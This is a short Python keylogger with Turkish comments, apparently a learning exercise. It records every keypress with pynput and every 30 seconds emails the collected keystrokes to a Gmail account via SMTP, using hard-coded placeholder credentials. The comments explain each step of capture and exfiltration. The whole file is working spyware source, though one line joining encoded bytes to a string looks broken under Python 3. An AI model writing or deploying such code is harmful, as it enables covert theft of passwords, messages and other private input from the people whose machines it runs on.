import pynput.keyboard
import smtplib
import threading
# mail atmak icin kullanacagimiz kutuphane
# klavye ve mouse hareketlerini takip etmek icin kullanilir
# callbak funtion bize klavyeden basilan key leri tek tek yollayacak
# boylelikle listenerdan aldigim callback function i isleyebilecegim
log = ""
def callback_function(key):
    global log
    try:
        log = log + key.char.encode("utf-8")
        # log = log +str(key.char) --> burada tum karakterleri kaydediyor ancak basina u ekliyor
        # turkce karakter hatasini cozebilmek icin utf-8 e encode ettik
    except AttributeError:
    # hata alirsa bu adimi uygulayacak
    # bosluk birakarak yaim yapabilmek icin key.space tanimladik
        if key == key.space:
            log = log + " "
        else :
            log = log + str(key)
    # bir smtp server olusturup buradan kendi mail hesabimiza baglanip mail gonderecegiz.
def send_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()

# thread - threading
# yazdigimiz fonksiyonlarin cogu loop a dusuyor ve bir sonraki fonk'a gecemiyor
# bunun onune gecmek icin threadFunction kullanacagiz.
def thread_function():
    global log
    send_email("testmail@gmail.com","pass123123",log)
    log = ""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()
# klavyeye tiklandiginde gelen bir paketi listener aliyor
# ve bunlari kaydetmesi icin bir foksiyona gonderiyor
# "with" yonetilmeyen veri akislarinda (dosya yada listener'larda kullanilir)
keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    thread_function()
    keylogger_listener.join()